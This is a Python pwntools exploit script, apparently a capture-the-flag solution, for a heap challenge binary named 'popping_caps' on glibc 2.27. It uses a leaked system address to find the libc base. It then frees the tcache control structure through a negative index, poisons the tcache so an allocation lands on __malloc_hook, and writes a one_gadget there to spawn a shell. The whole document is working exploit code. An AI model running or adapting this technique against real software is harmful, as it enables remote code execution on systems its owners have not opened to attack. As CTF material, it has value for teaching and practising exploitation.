#!/usr/bin/env python3

from pwn import *

exe = ELF("./popping_caps")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def malloc(size):
    	r.sendline("1")
    	r.sendline(str(size))

    def free(idx):
    	r.sendline("2")
    	r.sendline(str(idx))

    def write(data):
    	r.sendline("3")
    	r.send(data)


    # libc leak
    r.recvuntil("Here is system 0x")
    leak = int(r.recvn(12), 16)
    libc.address = leak - libc.symbols['system']
    log.info("libc base: {}".format(hex(libc.address)))
    log.info("__malloc_hook address: {}".format(hex(libc.symbols['__malloc_hook']))) 

    one_gadget = libc.address + 0x10a38c
    malloc(0x20)
    free(-592)
    malloc(0x240) # control chunk that has tcache head pointers & counts 
    write(p64(1) + "\x00" * (8*7) + p64(libc.symbols['__malloc_hook']) + "\x00" * (0xff - 8 - 8*7 - 8))
    malloc(0)
    write(p64(one_gadget) + "\x00" * (0xff - 8))
    malloc(0xdeadbeef)
    #gdb.attach(r)
    
    r.interactive()


if __name__ == "__main__":
    main()
